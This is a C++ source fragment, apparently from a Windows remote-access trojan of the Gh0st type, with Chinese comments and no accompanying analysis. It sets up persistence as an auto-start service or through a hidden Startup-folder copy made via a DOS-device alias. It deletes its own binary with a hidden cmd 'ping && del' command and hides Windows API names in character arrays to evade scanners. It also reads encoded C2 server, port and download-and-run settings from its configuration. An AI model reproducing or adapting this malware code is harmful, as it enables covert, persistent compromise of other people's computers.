	if (OsVerInfoEx.dwMajorVersion < 6) //判断那种系统，如果小于6，创建交互式服务
		dwServiceType = SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS;
	else
		dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	
	__try
	{
		schManager = pOpenSCManagerA(0,0,SC_MANAGER_CREATE_SERVICE);
		if (schManager == NULL)
			__leave;
		
		schService = pCreateServiceA(
			schManager, lpServiceName, lpDisplayName,
			SERVICE_CHANGE_CONFIG|SERVICE_START,
			dwServiceType,
			SERVICE_AUTO_START,
			SERVICE_ERROR_IGNORE,
			szInstallModule,NULL, NULL, NULL, NULL, NULL);
		
		if (schService != NULL)
		{
			//锁定一下服务...
			SC_LOCK sc_lock=pLockServiceDatabase(schManager);
			SERVICE_DESCRIPTION Service_Descrip={&modify_data.Serdesc[0]};
			pChangeServiceConfig2A(schService,SERVICE_CONFIG_DESCRIPTION,&Service_Descrip);
			pUnlockServiceDatabase(sc_lock);
			
			if (!pStartServiceA(schService,0,0))
				__leave;
		}
		else
		{
			if (GetLastError() == ERROR_SERVICE_EXISTS)
			{
				schService = pOpenServiceA(schManager,lpServiceName,SERVICE_CHANGE_CONFIG|SERVICE_START);
				if (schService != NULL)
				{
					pChangeServiceConfigA(schService,SERVICE_NO_CHANGE,SERVICE_AUTO_START,SERVICE_NO_CHANGE,
						NULL,NULL,NULL,NULL,NULL,NULL,NULL);
					pStartServiceA(schService,0,0);
				}
				else __leave;
			}
		}
	}
	__finally
	{
		if (schService!=NULL)
		{
			pCloseServiceHandle(schService);
		}
		if (schManager!=NULL)
		{
			pCloseServiceHandle(schManager);
		}
	}
}

BOOL DeleteMe()
{
	char lygUR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char dTyuB[]={'S','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A','\0'};
	SetFileAttributesAT pSetFileAttributesA=(SetFileAttributesAT)MyGetProcAddressA(lygUR,dTyuB);
	
	char kIlMs[]={'G','e','t','S','h','o','r','t','P','a','t','h','N','a','m','e','A','\0'};
	GetShortPathNameAT pGetShortPathNameA=(GetShortPathNameAT)MyGetProcAddressA(lygUR,kIlMs);
	
	char oLkmS[]={'S','e','t','P','r','i','o','r','i','t','y','C','l','a','s','s','\0'};
	SetPriorityClassT pSetPriorityClass=(SetPriorityClassT)MyGetProcAddressA(lygUR,oLkmS);
	
	char dFjXv[]={'S','e','t','T','h','r','e','a','d','P','r','i','o','r','i','t','y','\0'};
	SetThreadPriorityT pSetThreadPriority=(SetThreadPriorityT)MyGetProcAddressA(lygUR,dFjXv);
	
	char pJmfS[]={'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)MyGetProcAddressA(lygUR,pJmfS);
	
	char sIkmF[]={'R','e','s','u','m','e','T','h','r','e','a','d','\0'};
	ResumeThreadT pResumeThread=(ResumeThreadT)MyGetProcAddressA(lygUR,sIkmF);
	
	TCHAR szModule [MAX_PATH];
	TCHAR szComspec[MAX_PATH];
	TCHAR szParams [MAX_PATH];
	
	if (GetModuleFileName(0,szModule,MAX_PATH)==0)
		return FALSE;
	if (pGetShortPathNameA(szModule,szModule,MAX_PATH)==0)
		return FALSE;
	if (GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)==0)
		return FALSE;
	
	// set command shell parameters
	pSetFileAttributesA(szModule,FILE_ATTRIBUTE_NORMAL);
	strcpy(szParams, " /c ping -n 2 127.0.0.1 > nul && del ");
	strcat(szParams, szModule);
	strcat(szParams, " > nul");
	strcat(szComspec, szParams);
	
	// set struct members
	STARTUPINFO si = {0};
	PROCESS_INFORMATION	pi = {0};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	
	// increase resource allocation to program
	pSetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
	pSetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
	
	// invoke command shell
	if(pCreateProcessA(0,szComspec,0,0,0,CREATE_SUSPENDED,0,0,&si,&pi))
	{
		// suppress command shell process until program exits
		pSetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
		pSetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE); 
		// resume shell process with new low priority
		pResumeThread(pi.hThread);
		// everything seemed to work
		return TRUE;
	}
	else // if error, normalize allocation
	{
		pSetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
		pSetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_NORMAL);
	}
	return FALSE;
}

DWORD __stdcall MainThread()
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 1;
}


extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
{

	//解密配置信息结构体
	int nInStallSizeof=sizeof(MODIFY_DATA)+1;
	MODIFY_DATA *pNewInStall=(MODIFY_DATA *)new  char[nInStallSizeof];
	memcpy(pNewInStall,&m_Install,nInStallSizeof);
	lstrcpy(modify_data.szDns1,pNewInStall->szDns1);       //szDns1----需MyDecode解密
	lstrcpy(modify_data.szDns2,pNewInStall->szDns2);       //szDns2----需MyDecode解密
	lstrcpy(modify_data.szGroup,pNewInStall->szGroup);     //szGroup---需MyDecode解密
	lstrcpy(modify_data.szVersion,pNewInStall->szVersion); //szVersion-需MyDecode解密
	lstrcpy(modify_data.SerName,pNewInStall->SerName);
	lstrcpy(modify_data.Serdisplay,pNewInStall->Serdisplay);
	lstrcpy(modify_data.Serdesc,pNewInStall->Serdesc);
	lstrcpy(modify_data.szGetGroup,pNewInStall->szGetGroup);
	lstrcpy(modify_data.ReleasePath,pNewInStall->ReleasePath);
	lstrcpy(modify_data.ReleaseName,pNewInStall->ReleaseName);
	lstrcpy(modify_data.szDownRun,pNewInStall->szDownRun); //szDownRun-需MyDecode解密
	
	modify_data.dwPort1=pNewInStall->dwPort1;
	modify_data.dwPort2=pNewInStall->dwPort2;
	modify_data.bLanPenetrate=pNewInStall->bLanPenetrate;
	modify_data.bService=pNewInStall->bService;
	modify_data.bRuns=pNewInStall->bRuns;
	modify_data.bRunOnce=pNewInStall->bRunOnce;
	modify_data.Dele_zd=pNewInStall->Dele_zd;
	modify_data.FileAttribute=pNewInStall->FileAttribute;

	char oGsR3[]={'U','S','E','R','3','2','.','d','l','l','\0'};
	char iUmsT[]={'P','o','s','t','T','h','r','e','a','d','M','e','s','s','a','g','e','A','\0'};
	PostThreadMessageAT pPostThreadMessageA=(PostThreadMessageAT)MyGetProcAddressA(oGsR3,iUmsT);
	
	char dFkrS[]={'G','e','t','I','n','p','u','t','S','t','a','t','e','\0'};
	GetInputStateT pGetInputState=(GetInputStateT)MyGetProcAddressA(oGsR3,dFkrS);
	
	char xDrfV[]={'G','e','t','M','e','s','s','a','g','e','A','\0'};
	GetMessageAT pGetMessageA=(GetMessageAT)MyGetProcAddressA(oGsR3,xDrfV);
	
	char lygUR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char gfKIk[]={'E','x','p','a','n','d','E','n','v','i','r','o','n','m','e','n','t','S','t','r','i','n','g','s','A','\0'};
	ExpandEnvironmentStringsAT pExpandEnvironmentStringsA=(ExpandEnvironmentStringsAT)MyGetProcAddressA(lygUR,gfKIk);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char KoX3m[]={'S','t','a','r','t','S','e','r','v','i','c','e','C','t','r','l','D','i','s','p','a','t','c','h','e','r','A','\0'};
	StartServiceCtrlDispatcherAT pStartServiceCtrlDispatcherA=(StartServiceCtrlDispatcherAT)MyGetProcAddressA(AjrFx,KoX3m);
	
	char Oz3jm[]={'S','H','E','L','L','3','2','.','d','l','l','\0'};
	char Jsvl0[]={'S','H','G','e','t','S','p','e','c','i','a','l','F','o','l','d','e','r','P','a','t','h','A','\0'};
	SHGetSpecialFolderPathAT pSHGetSpecialFolderPathA = (SHGetSpecialFolderPathAT)MyGetProcAddressA(Oz3jm,Jsvl0);
	
	char r6oRe[]={'G','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A','\0'};
	GetFileAttributesAT pGetFileAttributesA = (GetFileAttributesAT)MyGetProcAddressA(lygUR,r6oRe);
	
	char hXK3S[]={'D','e','f','i','n','e','D','o','s','D','e','v','i','c','e','A','\0'};
	DefineDosDeviceAT pDefineDosDeviceA=(DefineDosDeviceAT)MyGetProcAddressA(lygUR,hXK3S);
	
	char ri7mX[]={'C','o','p','y','F','i','l','e','A','\0'};
	CopyFileAT pCopyFileA=(CopyFileAT)MyGetProcAddressA(lygUR,ri7mX);
	
	char KolJS[]={'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
	ShellExecuteAT pShellExecuteA=(ShellExecuteAT)MyGetProcAddressA(Oz3jm,KolJS);
	
	char sFmcZ[]={'S','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A','\0'};
	SetFileAttributesAT pSetFileAttributesA=(SetFileAttributesAT)MyGetProcAddressA(lygUR,sFmcZ);
	
	// 让启动程序时的小漏斗马上消失
	pPostThreadMessageA(GetCurrentThreadId(),NULL,0,0);
	pGetInputState();
	MSG	msg;
	pGetMessageA(&msg,NULL,NULL,NULL);
	
	SECURITY_DESCRIPTOR sd; //安全描述
	SECURITY_ATTRIBUTES sa; //安全属性
	//设置互斥安全属性
	InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd,TRUE,NULL,FALSE);
	sa.bInheritHandle = FALSE;
	sa.lpSecurityDescriptor = &sd;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	
	LPSTR lpCommandLine = GetCommandLine();
	char szEntryName[MAX_PATH] = {0};
	strcat(szEntryName, "Global\\");
	strcat(szEntryName, lpCommandLine);
	g_hMutexEntry = CreateMutex(&sa,FALSE,szEntryName);
	if (g_hMutexEntry && GetLastError()==ERROR_ALREADY_EXISTS)
		return FALSE;
	
	char ExpandPath[MAX_PATH];
	pExpandEnvironmentStringsA(modify_data.ReleasePath,ExpandPath,MAX_PATH); //%SystemRoot%\扩充成完整路径C:\WINDOWS\ 
	strcpy(modify_data.ReleasePath,ExpandPath);
	if(modify_data.ReleasePath[strlen(modify_data.ReleasePath)-1]=='\\') //去掉最后的'\\'
		modify_data.ReleasePath[strlen(modify_data.ReleasePath)-1]=0;
	
	if (!modify_data.bRunOnce) //如果不是绿色安装
	{
		if (modify_data.bService)
		{
			InstallMode = 1;
			if (strstr(lpCommandLine," -acsi") != NULL)
			{
				while(1)
				{
					Sleep(50);
					MainThread();
				}
			}
			else //如果服务已存在则启动，不存在则安装
			{
				if (ServiceIsExist(modify_data.SerName))
				{
					SERVICE_TABLE_ENTRY serviceTable[] = 
					{
						{modify_data.SerName,ServiceMain},
						{NULL,NULL}
					};
					if (!pStartServiceCtrlDispatcherA(serviceTable)) //进入服务入口
					{
						SC_HANDLE schManager = NULL, schService = NULL;
						schManager = OpenSCManager(NULL, NULL, STANDARD_RIGHTS_EXECUTE);
						if (schManager != NULL)
						{
							schService = OpenService(schManager, modify_data.SerName, SERVICE_START);
							if (schService != NULL)
							{
								if (StartService(schService, 0, NULL))
								{
									CloseServiceHandle(schService);
									CloseServiceHandle(schManager);
									DeleteMe();
									//exit(0);
									ExitProcess(0);
								}
								CloseServiceHandle(schService);
							}
							CloseServiceHandle(schManager);
						}
					}
				}
				else
				{
					char DQeBW01[] = {'%','s','\\','%','s','\0'};
					char AZnames[MAX_PATH]={NULL};   //安装途径及名称
					sprintf(AZnames,DQeBW01,modify_data.ReleasePath,modify_data.ReleaseName); //连接安装目录和程序名称
					MarkTime(modify_data.SerName); //写入安装时间信息
					ServiceInstall(AZnames,modify_data.SerName,modify_data.Serdisplay,modify_data.Serdesc);
					DeleteMe();
					//exit(0);
					ExitProcess(0);
				}
				while(1)
				{
					Sleep(50);
					MainThread();
				}
			}
		}
		if (modify_data.bRuns)
		{
			InstallMode = 2;
			MarkTime(modify_data.SerName); //写入安装时间信息
			
			char StartupPath[MAX_PATH]={NULL};
			if (!pSHGetSpecialFolderPathA(NULL,StartupPath,CSIDL_COMMON_STARTUP,FALSE))
				return FALSE;
			
			char FilePath[MAX_PATH]={NULL}, uX6Yz[]={'%','s','\\','%','s','\0'};
			sprintf(FilePath,uX6Yz,StartupPath,modify_data.ReleaseName);
			
			if (pGetFileAttributesA(FilePath) == INVALID_FILE_ATTRIBUTES)
			{
				char InstallModule[MAX_PATH];
				GetModuleFileName(NULL,InstallModule,sizeof(InstallModule));
				char vSfjE[]={'\\','?','?','\\','%','s','\\','%','s','\0'};
				sprintf(FilePath,vSfjE,StartupPath,modify_data.ReleaseName);
				char rJmhC[]={'a','g','m','k','i','s','2','\0'};
				pDefineDosDeviceA(1,rJmhC,FilePath);
				Sleep(100);
				char tHjnX[]={'\\','\\','.','\\','a','g','m','k','i','s','2','\0'};
				pCopyFileA(InstallModule,tHjnX,FALSE);
				pSetFileAttributesA(StartupPath,FILE_ATTRIBUTE_HIDDEN);
//				ServiceFileAddSize(tHjnX);
				sprintf(FilePath,uX6Yz,StartupPath,modify_data.ReleaseName);
				pShellExecuteA(NULL,"open",FilePath,NULL,StartupPath,SW_SHOWDEFAULT);
				DeleteMe();
				//exit(0);
				ExitProcess(0);
			}
			while(1)
			{
				Sleep(50);
				MainThread();
			}
		}
	}
	else //绿色安装直接启动
	{
		InstallMode = 0;
		MarkTime(modify_data.SerName); //写入安装时间信息
		while(1)
		{
			Sleep(50);
			MainThread();
		}
	}
	
    return 0;

}

BOOL APIENTRY DllMain( HANDLE hModule,
					  DWORD  ul_reason_for_call,
					  LPVOID lpReserved
					  )
{
	
    return TRUE;
}
